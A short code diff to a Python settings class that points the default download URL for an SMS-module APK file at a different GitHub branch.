@@ -16,7 +16,7 @@ class Settings(BaseSettings):
     public_base_url: str = ""
     apk_github_url: str = (
         "https://raw.githubusercontent.com/hivirtusss/V2-testing-done/"
-        "cursor/astik-minimal-flow-8042/apk/virtus-sms-module.apk"
+        "cursor/channel-auto-forward-8042/apk/virtus-sms-module.apk"
     )
 
     @property
